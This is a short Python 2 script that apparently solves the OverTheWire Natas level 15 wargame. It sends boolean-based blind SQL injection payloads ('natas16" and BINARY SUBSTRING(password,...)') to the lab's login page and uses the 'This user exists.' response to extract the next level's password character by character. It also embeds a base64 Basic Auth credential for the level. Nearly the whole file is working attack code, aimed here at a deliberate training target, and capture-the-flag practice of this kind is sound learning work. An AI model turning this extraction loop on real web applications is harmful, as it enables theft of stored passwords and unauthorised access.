#!/usr/bin/env python
import urllib2
import base64, string

host='http://natas15.natas.labs.overthewire.org/index.php?username=natas16"+and+BINARY+SUBSTRING(password,%s,1)+=+"%s'
basicAuth='bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
alph=string.ascii_letters+'0123456789'
i=1
res_passwd=''
while i!=64:
    try:
	curSize = len( res_passwd )
	for symbol in alph:
	    req_str = host % (str(i), symbol)
	    request = urllib2.Request(req_str)
	    request.add_header( "Authorization", "Basic %s" % basicAuth )   
	    req_res = urllib2.urlopen( request )
	    req_data = req_res.read()
	    if "This user exists." in req_data:
	        res_passwd += symbol
	        print res_passwd
	        i += 1
	        break 		 
	if curSize == len( res_passwd ):
	    print "password is ", res_passwd
	    break
    except(KeyboardInterrupt, EOFError):
        break
exit()
